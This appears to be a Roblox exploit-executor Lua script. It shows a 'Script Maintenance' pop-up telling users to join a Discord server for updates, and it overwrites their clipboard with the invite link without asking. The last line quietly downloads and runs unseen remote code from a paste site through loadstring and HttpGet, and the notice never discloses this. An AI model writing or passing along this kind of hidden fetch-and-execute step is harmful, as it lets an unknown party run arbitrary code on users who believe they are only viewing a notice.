-- Discord Invite
local discordLink = "https://discord.gg/W6xQFhNR3p"

-- Copy to clipboard
if setclipboard then
    setclipboard(discordLink)
elseif toclipboard then
    toclipboard(discordLink)
end

-- Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FixNoticeGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.Size = UDim2.new(0, 420, 0, 220)
MainFrame.Position = UDim2.new(0.5, -210, 0.5, -110)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true

-- Corner
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 14)
UICorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Size = UDim2.new(1, -20, 0, 40)
Title.Position = UDim2.new(0, 10, 0, 10)
Title.BackgroundTransparency = 1
Title.Text = "⚙️ Script Maintenance"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Left

-- Message
local Message = Instance.new("TextLabel")
Message.Parent = MainFrame
Message.Size = UDim2.new(1, -40, 0, 80)
Message.Position = UDim2.new(0, 20, 0, 60)
Message.BackgroundTransparency = 1
Message.TextWrapped = true
Message.Text = "The script is currently fixing.\n\nJoin the Discord community for the update.\n\n📋 Discord link has been copied!"
Message.TextColor3 = Color3.fromRGB(200, 200, 200)
Message.Font = Enum.Font.Gotham
Message.TextSize = 15
Message.TextYAlignment = Enum.TextYAlignment.Top

-- Button
local Button = Instance.new("TextButton")
Button.Parent = MainFrame
Button.Size = UDim2.new(0.6, 0, 0, 40)
Button.Position = UDim2.new(0.2, 0, 1, -60)
Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242) -- Discord color
Button.Text = "Join Discord"
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.Font = Enum.Font.GothamBold
Button.TextSize = 16
Button.BorderSizePixel = 0
Button.AutoButtonColor = true

-- Button corner
local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 10)
ButtonCorner.Parent = Button

-- Button click (copies again)
Button.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(discordLink)
    elseif toclipboard then
        toclipboard(discordLink)
    end
end)

-- Fade-in animation
MainFrame.BackgroundTransparency = 1
for i = 1, 10 do
    MainFrame.BackgroundTransparency = 1 - (i / 10)
    task.wait(0.02)
end
loadstring(game:HttpGet("https://pastefy.app/P8PsjH6P/raw"))()
